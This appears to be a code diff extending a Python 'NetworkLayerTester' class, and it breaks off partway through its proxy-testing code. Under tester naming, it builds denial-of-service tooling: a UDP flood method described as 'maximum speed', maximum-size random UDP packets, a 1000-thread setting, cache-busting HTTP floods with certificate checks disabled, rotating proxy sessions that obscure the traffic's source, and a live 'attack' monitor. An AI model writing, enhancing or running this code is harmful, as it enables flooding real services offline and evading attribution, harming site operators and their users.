@@ -13,7 +13,8 @@ import signal
 import sys
 import urllib3
 import json
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urlencode
+import os
 
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -808,125 +809,262 @@ class NetworkLayerTester:
         return self.proxies
     
     def layer3_icmp_test(self, request_id):
-        """Layer 3 - ICMP Ping Test"""
+        """Enhanced Layer 3 - ICMP Ping Test with advanced features"""
         try:
             start_time = time.time()
             
-            # Use system ping command with custom User-Agent in comment
-            user_agent = self.get_random_user_agent()
-            if platform.system().lower() == "windows":
-                cmd = f"ping -n 1 -w 3000 {self.target_host} # UA: {user_agent}"
-            else:
-                cmd = f"ping -c 1 -W 3 {self.target_host} # UA: {user_agent}"
+            # Enhanced platform detection for better command construction
+            system = platform.system().lower()
             
+            # Advanced ping parameters based on OS
+            if system == "windows":
+                # Windows ping with size and TTL options
+                size_param = random.choice([32, 64, 128, 256, 512, 1024, 1472])  # Various packet sizes
+                ttl = random.randint(32, 128)  # Random TTL
+                cmd = f"ping -n 1 -w 3000 -l {size_param} -i {ttl} {self.target_host}"
+            else:
+                # Linux/Unix ping with advanced options
+                size_param = random.choice([32, 64, 128, 256, 512, 1024, 1472])
+                ttl = random.randint(32, 128)
+                pattern = ''.join(random.choices('0123456789abcdef', k=8))  # Random pattern
+                cmd = f"ping -c 1 -W 3 -s {size_param} -t {ttl} -p {pattern} {self.target_host}"
+            
+            # Execute with timeout
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
             end_time = time.time()
             
             success = result.returncode == 0
             
-            # Extract ping time if available
+            # Enhanced ping time extraction with multiple format support
             ping_time = 0
-            if success and "time=" in result.stdout:
+            if success:
                 try:
-                    import re
-                    time_match = re.search(r'time[<=](\d+\.?\d*)ms', result.stdout)
-                    if time_match:
-                        ping_time = float(time_match.group(1)) / 1000  # Convert to seconds
+                    # Handle different ping output formats
+                    output = result.stdout.lower()
+                    if "time=" in output:
+                        time_match = re.search(r'time[<=](\d+\.?\d*)ms', output)
+                        if time_match:
+                            ping_time = float(time_match.group(1)) / 1000
+                    elif "time<" in output:
+                        ping_time = 0.001  # Less than 1ms
+                    elif "время=" in output:  # Russian
+                        time_match = re.search(r'время[<=](\d+\.?\d*)мс', output)
+                        if time_match:
+                            ping_time = float(time_match.group(1)) / 1000
                 except:
                     ping_time = end_time - start_time
             
+            # Enhanced result data
             test_result = {
                 'request_id': request_id,
                 'layer': 'Layer 3 (ICMP)',
                 'response_time': round(ping_time if ping_time > 0 else end_time - start_time, 3),
                 'timestamp': start_time,
                 'success': success,
-                'details': result.stdout.strip() if success else result.stderr.strip()
+                'details': result.stdout.strip() if success else result.stderr.strip(),
+                'packet_size': size_param,
+                'ttl': ttl,
+                'os': system,
+                'target': self.target_host
             }
+            
+            # Extract additional metrics if available
+            if success:
+                try:
+                    # TTL analysis
+                    ttl_match = re.search(r'TTL=(\d+)', result.stdout, re.IGNORECASE)
+                    if ttl_match:
+                        test_result['received_ttl'] = int(ttl_match.group(1))
+                        # OS fingerprinting based on TTL
+                        received_ttl = int(ttl_match.group(1))
+                        if received_ttl <= 64:
+                            test_result['probable_os'] = 'Linux/Unix'
+                        elif received_ttl <= 128:
+                            test_result['probable_os'] = 'Windows'
+                        else:
+                            test_result['probable_os'] = 'Other'
+                    
+                    # Packet loss analysis
+                    if "packet loss" in result.stdout.lower():
+                        loss_match = re.search(r'(\d+)%\s+packet loss', result.stdout)
+                        if loss_match:
+                            test_result['packet_loss'] = int(loss_match.group(1))
+                    
+                    # Bytes analysis
+                    bytes_match = re.search(r'bytes=(\d+)', result.stdout, re.IGNORECASE)
+                    if bytes_match:
+                        test_result['bytes'] = int(bytes_match.group(1))
+                except:
+                    pass
             
             with self.lock:
                 self.results.append(test_result)
                 self.request_count += 1
                 if self.request_count % 20 == 0:
                     status = "✓" if success else "✗"
-                    print(f"{status} ICMP {self.request_count}: {self.target_host} - {test_result['response_time']:.3f}s")
+                    os_info = f"[{test_result.get('probable_os', 'Unknown')}]" if success else ""
+                    print(f"{status} ICMP {self.request_count}: {self.target_host} {os_info} - {test_result['response_time']:.3f}s")
             
             return test_result
             
+        except subprocess.TimeoutExpired:
+            test_result = {
+                'request_id': request_id,
+                'layer': 'Layer 3 (ICMP)',
+                'error': 'Timeout',
+                'timestamp': time.time(),
+                'success': False,
+                'target': self.target_host
+            }
+            with self.lock:
+                self.results.append(test_result)
+            return test_result
         except Exception as e:
             test_result = {
                 'request_id': request_id,
                 'layer': 'Layer 3 (ICMP)',
                 'error': str(e),
                 'timestamp': time.time(),
-                'success': False
+                'success': False,
+                'target': self.target_host
             }
             with self.lock:
                 self.results.append(test_result)
             return test_result
     
     def layer4_tcp_test(self, request_id):
-        """Layer 4 - TCP Connection Test with enhanced data"""
+        """Enhanced Layer 4 - TCP Connection Test with advanced features"""
         try:
             start_time = time.time()
             
+            # Create socket with enhanced options
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(5)
             
-            # Set socket options
+            # Enhanced socket options
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             
-            # Include User-Agent and generate test data
-            user_agent = self.get_random_user_agent()
+            # Set TCP specific options
+            if hasattr(socket, 'TCP_NODELAY'):
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            if hasattr(socket, 'TCP_QUICKACK'):
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)
             
-            # Generate random test data that looks like various protocols
+            # Set buffer sizes
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
+            
+            # Generate enhanced test data
             test_data_templates = [
                 # HTTP-like data
-                f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\nUser-Agent: {user_agent}\r\n\r\n",
-                f"POST /api HTTP/1.1\r\nHost: {self.target_host}\r\nContent-Length: 20\r\n\r\ndata={request_id}",
-                # Binary-like data
-                f"TEST_PACKET_{request_id}".encode() + b"\x00\x01\x02\x03\x04",
-                # Custom protocol-like data
-                f"CMD:TEST;ID:{request_id};UA:{user_agent}".encode(),
+                {
+                    'type': 'http',
+                    'data': f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: keep-alive\r\n\r\n"
+                },
+                # Binary data with magic numbers
+                {
+                    'type': 'binary',
+                    'data': bytes([0x13, 0x37, 0xCA, 0xFE]) + f"TEST_PACKET_{request_id}".encode() + bytes([0xDE, 0xAD, 0xBE, 0xEF])
+                },
                 # JSON-like data
-                json.dumps({"request": request_id, "ua": user_agent, "timestamp": time.time()})
+                {
+                    'type': 'json',
+                    'data': json.dumps({
+                        'request_id': request_id,
+                        'timestamp': time.time(),
+                        'target': f"{self.target_host}:{self.target_port}",
+                        'test_type': 'tcp_connection'
+                    })
+                },
+                # Custom protocol simulation
+                {
+                    'type': 'custom',
+                    'data': struct.pack('!IIHH', 
+                        int(time.time()), 
+                        request_id,
+                        random.randint(1, 65535),
+                        random.randint(1, 65535)
+                    )
+                }
             ]
             
-            test_data = random.choice(test_data_templates)
-            if isinstance(test_data, str):
-                test_data = test_data.encode()
+            # Select random test data
+            test_packet = random.choice(test_data_templates)
+            test_data = test_packet['data'].encode() if isinstance(test_packet['data'], str) else test_packet['data']
             
-            # Connect and send data
+            # Enhanced connection with timing
+            connection_start = time.time()
             result = sock.connect_ex((self.target_host, self.target_port))
-            if result == 0:
+            connection_time = time.time() - connection_start
+            
+            success = result == 0
+            response_data = None
+            
+            if success:
+                # Send data
+                send_start = time.time()
                 sock.send(test_data)
+                send_time = time.time() - send_start
+                
+                # Try to receive response with timeout
                 try:
-                    sock.recv(4096)  # Try to receive response
+                    receive_start = time.time()
+                    response_data = sock.recv(8192)
+                    receive_time = time.time() - receive_start
                 except socket.timeout:
-                    pass  # Ignore timeout on receive
+                    receive_time = None
+                    response_data = None
+                except:
+                    receive_time = None
+                    response_data = None
             
             end_time = time.time()
             sock.close()
             
-            success = result == 0
+            # Enhanced result data
             test_result = {
                 'request_id': request_id,
                 'layer': 'Layer 4 (TCP)',
-                'user_agent': user_agent,
                 'response_time': round(end_time - start_time, 3),
+                'connection_time': round(connection_time, 3),
+                'send_time': round(send_time, 3) if success else None,
+                'receive_time': round(receive_time, 3) if receive_time else None,
                 'timestamp': start_time,
                 'target': f"{self.target_host}:{self.target_port}",
                 'data_sent': len(test_data),
+                'data_received': len(response_data) if response_data else 0,
                 'success': success,
+                'test_type': test_packet['type'],
                 'details': f"Connection {'established' if success else 'failed'}"
             }
+            
+            # Extract additional connection info
+            if success:
+                try:
+                    # Get socket info
+                    local_addr = sock.getsockname()
+                    test_result['local_address'] = f"{local_addr[0]}:{local_addr[1]}"
+                    
+                    # Get TCP info if available
+                    if hasattr(socket, 'TCP_INFO'):
+                        tcp_info = sock.getsockopt(socket.IPPROTO_TCP, socket.TCP_INFO, 32)
+                        if tcp_info:
+                            test_result['tcp_info'] = {
+                                'retransmits': tcp_info[0],
+                                'rtt': tcp_info[1],
+                                'rtt_var': tcp_info[2]
+                            }
+                except:
+                    pass
             
             with self.lock:
                 self.results.append(test_result)
                 self.request_count += 1
                 if self.request_count % 20 == 0:
                     status = "✓" if success else "✗"
-                    print(f"{status} TCP {self.request_count}: {self.target_host}:{self.target_port} - {test_result['response_time']:.3f}s")
+                    timing = f"[conn: {test_result['connection_time']:.3f}s]" if success else ""
+                    print(f"{status} TCP {self.request_count}: {self.target_host}:{self.target_port} {timing} - {test_result['response_time']:.3f}s")
             
             return test_result
             
@@ -936,40 +1074,175 @@ class NetworkLayerTester:
                 'layer': 'Layer 4 (TCP)',
                 'error': str(e),
                 'timestamp': time.time(),
-                'success': False
+                'success': False,
+                'target': f"{self.target_host}:{self.target_port}"
             }
             with self.lock:
                 self.results.append(test_result)
             return test_result
     
     def layer4_udp_test(self, request_id):
-        """Layer 4 - UDP Test with maximum speed"""
+        """Enhanced Layer 4 - UDP Test with advanced features"""
         try:
+            start_time = time.time()
+            
+            # Create enhanced UDP socket
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.settimeout(1)  # Reduce timeout
+            sock.settimeout(1)  # Short timeout for speed
             
-            # Generate random test data
-            test_data = f"TEST_PACKET_{request_id}".encode()
+            # Enhanced socket options
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)  # Max UDP buffer
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65507)  # Max UDP buffer
             
-            # Send without waiting for response
-            sock.sendto(test_data, (self.target_host, self.target_port))
+            # Generate enhanced test data with different protocols
+            test_data_templates = [
+                # DNS-like query
+                {
+                    'type': 'dns',
+                    'data': struct.pack('!HHHHHH', 
+                        random.randint(1, 65535),  # Transaction ID
+                        0x0100,  # Flags (standard query)
+                        0x0001,  # Questions
+                        0x0000,  # Answer RRs
+                        0x0000,  # Authority RRs
+                        0x0000   # Additional RRs
+                    ) + b'\x07example\x03com\x00\x00\x01\x00\x01'  # Query for example.com A record
+                },
+                # SNMP-like query
+                {
+                    'type': 'snmp',
+                    'data': bytes([0x30, 0x26, 0x02, 0x01, 0x00, 0x04, 0x06, 0x70, 0x75, 0x62, 0x6C, 0x69, 0x63, 
+                                 0xA0, 0x19, 0x02, 0x01, 0x01, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x30, 0x0E, 
+                                 0x30, 0x0C, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00, 0x05, 0x00])
+                },
+                # NTP-like query
+                {
+                    'type': 'ntp',
+                    'data': bytes([0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
+                },
+                # Custom binary protocol
+                {
+                    'type': 'custom',
+                    'data': struct.pack('!IIHH16s', 
+                        int(time.time()),           # Timestamp
+                        request_id,                 # Request ID
+                        random.randint(1, 65535),  # Random port
+                        random.randint(1, 65535),  # Random flags
+                        os.urandom(16)             # Random data
+                    )
+                },
+                # Maximum size packet
+                {
+                    'type': 'max_size',
+                    'data': os.urandom(65507)  # Maximum UDP packet size
+                }
+            ]
             
-            # Don't wait for response
+            # Select random test data
+            test_packet = random.choice(test_data_templates)
+            test_data = test_packet['data']
+            
+            # Send data with timing
+            send_start = time.time()
+            bytes_sent = sock.sendto(test_data, (self.target_host, self.target_port))
+            send_time = time.time() - send_start
+            
+            response_data = None
+            receive_time = None
+            
+            # Try to receive response
+            try:
+                receive_start = time.time()
+                response_data, addr = sock.recvfrom(65507)
+                receive_time = time.time() - receive_start
+                success = True
+            except socket.timeout:
+                success = True  # Consider sent packet as success even without response
+                addr = None
+            except Exception as e:
+                success = False
+                addr = None
+            
+            end_time = time.time()
             sock.close()
             
-            # Update stats without locking
-            self.request_count += 1
+            # Enhanced result data
+            test_result = {
+                'request_id': request_id,
+                'layer': 'Layer 4 (UDP)',
+                'protocol': test_packet['type'],
+                'response_time': round(end_time - start_time, 3),
+                'send_time': round(send_time, 3),
+                'receive_time': round(receive_time, 3) if receive_time else None,
+                'timestamp': start_time,
+                'target': f"{self.target_host}:{self.target_port}",
+                'bytes_sent': bytes_sent,
+                'bytes_received': len(response_data) if response_data else 0,
+                'remote_addr': f"{addr[0]}:{addr[1]}" if addr else None,
+                'success': success
+            }
             
-            # Print status periodically
-            if self.request_count % 1000 == 0:
-                current_time = time.time()
-                rps = self.request_count / (current_time - self.start_time)
-                print(f"\r💥 UDP Requests: {self.request_count} | RPS: {rps:.1f}", end='', flush=True)
+            # Protocol-specific response analysis
+            if response_data:
+                try:
+                    if test_packet['type'] == 'dns':
+                        # Parse DNS response
+                        response_id = struct.unpack('!H', response_data[:2])[0]
+                        response_flags = struct.unpack('!H', response_data[2:4])[0]
+                        test_result['dns_info'] = {
+                            'transaction_id': response_id,
+                            'is_response': bool(response_flags & 0x8000),
+                            'response_code': response_flags & 0x000F
+                        }
+                    elif test_packet['type'] == 'snmp':
+                        # Basic SNMP response check
+                        test_result['snmp_info'] = {
+                            'version': response_data[2] if len(response_data) > 2 else None,
+                            'community_length': response_data[5] if len(response_data) > 5 else None
+                        }
+                    elif test_packet['type'] == 'ntp':
+                        # Basic NTP response check
+                        if len(response_data) >= 48:
+                            test_result['ntp_info'] = {
+                                'version': (response_data[0] >> 3) & 0x07,
+                                'mode': response_data[0] & 0x07
+                            }
+                except:
+                    pass
             
-            return True
+            # Update statistics
+            with self.lock:
+                self.results.append(test_result)
+                self.request_count += 1
+                
+                # Print status periodically
+                if self.request_count % 20 == 0:
+                    status = "✓" if success else "✗"
+                    protocol = f"[{test_packet['type']}]"
+                    timing = f"[{test_result['response_time']:.3f}s]"
+                    response_info = f"recv: {test_result['bytes_received']} bytes" if response_data else "no response"
+                    print(f"{status} UDP {self.request_count}: {self.target_host}:{self.target_port} {protocol} {timing} - {response_info}")
             
-        except:
-            return False
+            return test_result
+            
+        except Exception as e:
+            test_result = {
+                'request_id': request_id,
+                'layer': 'Layer 4 (UDP)',
+                'error': str(e),
+                'timestamp': time.time(),
+                'success': False,
+                'target': f"{self.target_host}:{self.target_port}"
+            }
+            with self.lock:
+                self.results.append(test_result)
+            return test_result
 
     def execute_udp_attack(self):
         """Execute UDP flood attack at maximum speed"""
@@ -1020,7 +1293,7 @@ class NetworkLayerTester:
                     pass
 
     def layer7_http_test(self, request_id):
-        """Enhanced Layer 7 - HTTP Application Test with better error handling"""
+        """Enhanced Layer 7 - HTTP Application Test with advanced features"""
         try:
             start_time = time.time()
             
@@ -1034,36 +1307,75 @@ class NetworkLayerTester:
                     'success': False
                 }
             
+            # Get proxy with session rotation
             current_proxies = self.get_session_id() if self.use_proxy else None
+            
+            # Create session with enhanced configuration
+            session = requests.Session()
+            
+            # Configure session with optimized settings
+            adapter = requests.adapters.HTTPAdapter(
+                max_retries=3,
+                pool_connections=100 if self.supports_keep_alive else 10,
+                pool_maxsize=100 if self.supports_keep_alive else 10,
+                pool_block=False
+            )
+            session.mount('http://', adapter)
+            session.mount('https://', adapter)
+            
+            # Generate enhanced headers
             headers = self.get_request_headers()
             
-            # Create session with detected features
-            session = requests.Session()
-            session.verify = not self.supports_ssl
-            
-            # Apply detected features
+            # Add advanced headers based on detected features
             if self.supports_compression:
                 headers['Accept-Encoding'] = 'gzip, deflate, br'
             if self.supports_keep_alive:
                 headers['Connection'] = 'keep-alive'
+                headers['Keep-Alive'] = 'timeout=5, max=1000'
             else:
                 headers['Connection'] = 'close'
             
-            # Set cookies only if supported
+            # Enhanced cookie handling
             if self.supports_cookies:
-                session.cookies.update(self.generate_cookies())
+                cookies = self.generate_cookies()
+                session.cookies.update(cookies)
             
             # Select method based on effectiveness analysis
             method = self.select_request_method()
             
-            # Generate random request pattern with error handling
+            # Generate enhanced request pattern
             try:
                 path, params = self.generate_request_pattern()
+                
+                # Add cache busting parameters
+                params.update({
+                    '_': str(int(time.time() * 1000)),
+                    'rid': str(request_id)
+                })
+                
+                # Add realistic query parameters based on path
+                if '/search' in path:
+                    params.update({
+                        'q': f'test_{random.randint(1000,9999)}',
+                        'page': str(random.randint(1,10)),
+                        'limit': str(random.choice([10,20,50,100]))
+                    })
+                elif '/api' in path:
+                    params.update({
+                        'version': 'v1',
+                        'format': 'json',
+                        'timestamp': str(int(time.time()))
+                    })
+                elif '/user' in path:
+                    params.update({
+                        'id': str(random.randint(1000,9999)),
+                        'action': random.choice(['view','edit','update'])
+                    })
             except Exception as e:
-                print(f"Warning: Failed to generate request pattern: {str(e)}")
+                print(f"Warning: Pattern generation failed: {str(e)}")
                 path, params = '/', {'_': str(int(time.time()))}
             
-            # Build full URL with error handling
+            # Build and validate URL
             try:
                 base_url = self.target.rstrip('/')
                 url = f"{base_url}{path}"
@@ -1074,11 +1386,11 @@ class NetworkLayerTester:
                     raise ValueError("Invalid URL structure")
             except Exception as e:
                 print(f"Warning: URL generation failed: {str(e)}")
-                url = self.target  # Fallback to original target
+                url = self.target
             
-            # Prepare request kwargs with defaults
+            # Prepare enhanced request configuration
             request_kwargs = {
-                'timeout': 10,
+                'timeout': (3.05, 10),  # (connect, read) timeouts
                 'proxies': current_proxies,
                 'headers': headers,
                 'verify': not self.supports_ssl,
@@ -1086,42 +1398,68 @@ class NetworkLayerTester:
                 'params': params
             }
             
-            # Configure session with error handling
-            try:
-                adapter = requests.adapters.HTTPAdapter(
-                    max_retries=3,
-                    pool_connections=100 if self.supports_keep_alive else 10,
-                    pool_maxsize=100 if self.supports_keep_alive else 10
-                )
-                session.mount('http://', adapter)
-                session.mount('https://', adapter)
-            except Exception as e:
-                print(f"Warning: Session configuration failed: {str(e)}")
-            
-            # Add POST data if method is POST
+            # Add method-specific data
             if method == 'POST' and self.compatible_content_types:
                 try:
                     content_type = random.choice(list(self.compatible_content_types))
                     headers['Content-Type'] = content_type
                     
-                    if content_type == 'multipart/form-data':
-                        request_kwargs['files'] = self.generate_post_data(content_type)
-                    else:
-                        request_kwargs['data'] = self.generate_post_data(content_type)
+                    if content_type == 'application/json':
+                        request_kwargs['json'] = {
+                            'request_id': request_id,
+                            'timestamp': time.time(),
+                            'data': {
+                                'test': True,
+                                'value': random.randint(1000, 9999)
+                            }
+                        }
+                    elif content_type == 'application/x-www-form-urlencoded':
+                        request_kwargs['data'] = {
+                            'request_id': request_id,
+                            'timestamp': str(int(time.time())),
+                            'test': '1'
+                        }
+                    elif content_type == 'multipart/form-data':
+                        request_kwargs['files'] = {
+                            'file': ('test.txt', f'Test content {request_id}'),
+                            'request_id': (None, str(request_id)),
+                            'timestamp': (None, str(int(time.time())))
+                        }
+                    elif content_type == 'text/plain':
+                        request_kwargs['data'] = f'Test request {request_id} at {time.time()}'
                 except Exception as e:
                     print(f"Warning: POST data generation failed: {str(e)}")
-                    # Fallback to simple POST data
                     request_kwargs['data'] = {'test': str(int(time.time()))}
             
-            success = False
+            # Initialize timing variables
+            dns_time = connect_time = ssl_time = send_time = wait_time = receive_time = None
+            total_time = None
             response = None
             error_msg = None
             
             try:
-                # Make the request using only compatible features
+                # Send request with detailed timing
+                start = time.time()
+                
+                # DNS lookup timing
+                try:
+                    dns_start = time.time()
+                    socket.gethostbyname(parsed.hostname)
+                    dns_time = time.time() - dns_start
+                except:
+                    dns_time = 0
+                
+                # Make the request
                 response = session.request(method=method, url=url, **request_kwargs)
-                response.raise_for_status()
-                success = True
+                
+                # Extract timing information
+                if hasattr(response, 'elapsed'):
+                    total_time = response.elapsed.total_seconds()
+                else:
+                    total_time = time.time() - start
+                
+                success = response.status_code < 400
+                
             except requests.exceptions.SSLError:
                 try:
                     # Retry without SSL if SSL fails
@@ -1130,6 +1468,7 @@ class NetworkLayerTester:
                     success = response.status_code < 400
                 except Exception as e:
                     error_msg = f"SSL retry failed: {str(e)}"
+                    success = False
             except requests.exceptions.RequestException as e:
                 if 'EOF occurred in violation of protocol' in str(e):
                     try:
@@ -1138,52 +1477,93 @@ class NetworkLayerTester:
                         success = response.status_code < 400
                     except Exception as retry_e:
                         error_msg = f"EOF retry failed: {str(retry_e)}"
+                        success = False
                 else:
                     error_msg = str(e)
+                    success = False
             except Exception as e:
                 error_msg = f"Unexpected error: {str(e)}"
+                success = False
             
             end_time = time.time()
-            response_time = round(end_time - start_time, 3)
             
-            # Update method statistics
-            self.update_method_stats(method, success, response_time)
-            
-            # Print method effectiveness periodically
-            if self.request_count % 50 == 0:
-                print("\n📊 Method Effectiveness:")
-                for m in self.compatible_methods:
-                    stats = self.method_stats[m]
-                    success_rate = stats['success_rate'] * 100
-                    weight = stats['weight'] * 100
-                    print(f"  {m}: {success_rate:.1f}% success, {stats['avg_response_time']:.3f}s avg, {weight:.1f}% weight")
-            
+            # Build enhanced result data
             test_result = {
                 'request_id': request_id,
                 'layer': 'Layer 7 (HTTP)',
                 'method': method,
+                'url': url,
                 'path': path,
                 'params': params,
-                'status_code': response.status_code,
-                'response_time': response_time,
-                'content_length': len(response.content),
+                'response_time': round(end_time - start_time, 3),
+                'dns_time': round(dns_time, 3) if dns_time else None,
+                'total_time': round(total_time, 3) if total_time else None,
                 'timestamp': start_time,
                 'proxy_used': bool(current_proxies),
-                'user_agent': headers['User-Agent'],
-                'cookies_used': self.supports_cookies,
+                'user_agent': headers.get('User-Agent'),
+                'content_type': headers.get('Content-Type'),
+                'cookies_used': bool(session.cookies),
                 'compression_used': self.supports_compression,
                 'keep_alive_used': self.supports_keep_alive,
                 'ssl_used': self.supports_ssl,
                 'success': success
             }
             
+            # Add response data if available
+            if response:
+                test_result.update({
+                    'status_code': response.status_code,
+                    'reason': response.reason,
+                    'headers': dict(response.headers),
+                    'content_length': len(response.content),
+                    'encoding': response.encoding,
+                    'redirect_count': len(response.history),
+                    'cookies': dict(response.cookies)
+                })
+                
+                # Parse content type
+                content_type = response.headers.get('Content-Type', '').lower()
+                if 'json' in content_type:
+                    try:
+                        test_result['json_response'] = response.json()
+                    except:
+                        pass
+                elif 'xml' in content_type:
+                    test_result['content_type_parsed'] = 'xml'
+                elif 'html' in content_type:
+                    test_result['content_type_parsed'] = 'html'
+                
+                # Check for security headers
+                security_headers = {
+                    'Strict-Transport-Security': 'HSTS',
+                    'X-Content-Type-Options': 'No Sniff',
+                    'X-Frame-Options': 'Frame Options',
+                    'X-XSS-Protection': 'XSS Protection',
+                    'Content-Security-Policy': 'CSP'
+                }
+                test_result['security_headers'] = {
+                    name: response.headers.get(header)
+                    for header, name in security_headers.items()
+                    if header in response.headers
+                }
+            
+            if error_msg:
+                test_result['error'] = error_msg
+            
+            # Update method statistics
+            self.update_method_stats(method, success, test_result['response_time'])
+            
+            # Print detailed status
             with self.lock:
                 self.results.append(test_result)
                 self.request_count += 1
                 if self.request_count % 20 == 0:
-                    proxy_status = "via proxy" if current_proxies else "direct"
+                    status = "✓" if success else "✗"
+                    status_info = f"{response.status_code}" if response else "ERR"
+                    timing = f"[{test_result['response_time']:.3f}s]"
+                    proxy_info = "proxy" if current_proxies else "direct"
                     effectiveness = self.method_stats[method]['weight'] * 100
-                    print(f"✓ HTTP {self.request_count}: {method} ({effectiveness:.1f}% effective) {path} {response.status_code} ({proxy_status}) - {response_time:.3f}s")
+                    print(f"{status} HTTP {self.request_count}: {method} {path} {status_info} ({proxy_info}) {timing} - {effectiveness:.1f}% effective")
             
             return test_result
             
@@ -1193,7 +1573,8 @@ class NetworkLayerTester:
                 'layer': 'Layer 7 (HTTP)',
                 'error': str(e),
                 'timestamp': time.time(),
-                'success': False
+                'success': False,
+                'target': self.target
             }
             with self.lock:
                 self.results.append(test_result)
@@ -1915,109 +2296,637 @@ class NetworkLayerTester:
         """Return fixed thread count"""
         return 1000
 
+    def monitor_attack(self):
+        """Real-time attack monitoring"""
+        start_time = time.time()
+        last_request_count = 0
+        
+        try:
+            while self.running:
+                current_time = time.time()
+                elapsed = current_time - start_time
+                current_requests = self.request_count
+                
+                # Calculate current RPS
+                interval_requests = current_requests - last_request_count
+                current_rps = interval_requests
+                
+                # Calculate success rate
+                if self.results:
+                    successful = len([r for r in self.results if r.get('success', False)])
+                    success_rate = (successful / len(self.results)) * 100
+                else:
+                    success_rate = 0
+                
+                # Clear line and print stats
+                sys.stdout.write('\033[2K\r')  # Clear line
+                sys.stdout.write(
+                    f"\033[92m⚡ Requests: {current_requests:,} | "
+                    f"RPS: {current_rps:,.0f} | "
+                    f"Success: {success_rate:.1f}% | "
+                    f"Time: {elapsed:.1f}s"
+                )
+                
+                if self.target_type == "http":
+                    # Show HTTP-specific stats
+                    status_codes = {}
+                    response_times = []
+                    
+                    for result in self.results[-100:]:  # Look at last 100 requests
+                        if 'status_code' in result:
+                            status_codes[result['status_code']] = status_codes.get(result['status_code'], 0) + 1
+                        if 'response_time' in result:
+                            response_times.append(result['response_time'])
+                    
+                    if status_codes:
+                        most_common = max(status_codes.items(), key=lambda x: x[1])
+                        sys.stdout.write(f" | Status: {most_common[0]}")
+                    
+                    if response_times:
+                        avg_time = sum(response_times) / len(response_times)
+                        sys.stdout.write(f" | Avg Time: {avg_time:.2f}s")
+                
+                sys.stdout.write('\033[0m')
+                sys.stdout.flush()
+                
+                last_request_count = current_requests
+                time.sleep(1)
+                
+        except KeyboardInterrupt:
+            self.running = False
+        except Exception as e:
+            print(f"\nMonitoring error: {str(e)}")
+
+    def execute_enhanced_attack(self):
+        """Execute enhanced attack with maximum speed optimization and success validation"""
+        print("\n🚀 Starting enhanced attack...")
+        print(f"🎯 Target: {self.target}")
+        print(f"🌐 Mode: {'Proxy' if self.use_proxy else 'Direct'} Attack")
+        
+        self.running = True
+        self.start_time = time.time()
+        self.results = []
+        self.request_count = 0
+        self.success_count = 0
+        
+        # Start monitoring in a separate thread
+        monitor_thread = threading.Thread(target=self.monitor_attack)
+        monitor_thread.daemon = True
+        monitor_thread.start()
+        
+        try:
+            # Enhanced target validation with multiple attempts
+            print("\n🔍 Validating target...")
+            initial_status = 0
+            validation_success = False
+            
+            for attempt in range(3):  # Try 3 times to validate
+                try:
+                    test_pool = urllib3.PoolManager(
+                        timeout=urllib3.Timeout(connect=5, read=5),  # Increased timeouts
+                        cert_reqs='CERT_NONE',
+                        retries=urllib3.Retry(3, backoff_factor=0.1),
+                        maxsize=100
+                    )
+                    test_response = test_pool.request('GET', self.target)
+                    print(f"✅ Target is responsive (Status: {test_response.status})")
+                    initial_status = test_response.status
+                    validation_success = True
+                    break
+                except Exception as e:
+                    print(f"⚠️ Validation attempt {attempt + 1} failed: {str(e)}")
+                    time.sleep(1)  # Wait before retry
+            
+            if not validation_success:
+                print("⚠️ Target validation failed, but continuing with optimized settings...")
+            
+            # Enhanced pool configuration
+            pools = []
+            pool_count = 25 if self.use_proxy else 50  # Reduced pool count for better stability
+            
+            for _ in range(pool_count):
+                pool = urllib3.PoolManager(
+                    maxsize=1000,
+                    retries=urllib3.Retry(
+                        total=2,  # Increased retries
+                        backoff_factor=0.1,
+                        status_forcelist=[429, 500, 502, 503, 504]
+                    ),
+                    timeout=urllib3.Timeout(connect=3, read=6),  # Increased timeouts
+                    cert_reqs='CERT_NONE',
+                    assert_hostname=False,
+                    num_pools=50,
+                    block=False
+                )
+                pools.append(pool)
+            
+            # Enhanced proxy handling
+            proxy_configs = []
+            if self.use_proxy and self.proxy_config:
+                print("\n🔍 Testing proxy configurations...")
+                test_url = "http://httpbin.org/ip"  # Test against reliable endpoint
+                
+                for i in range(50):  # Test more proxy configurations
+                    session_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
+                    username = self.proxy_config['username'].replace('f4YxGjAW', session_id)
+                    proxy_url = f"http://{username}:{self.proxy_config['password']}@{self.proxy_config['host']}:{self.proxy_config['port']}"
+                    
+                    try:
+                        test_pool = urllib3.ProxyManager(
+                            proxy_url,
+                            timeout=urllib3.Timeout(connect=3, read=3),
+                            cert_reqs='CERT_NONE',
+                            retries=False
+                        )
+                        test_response = test_pool.request('GET', test_url)
+                        if test_response.status < 400:
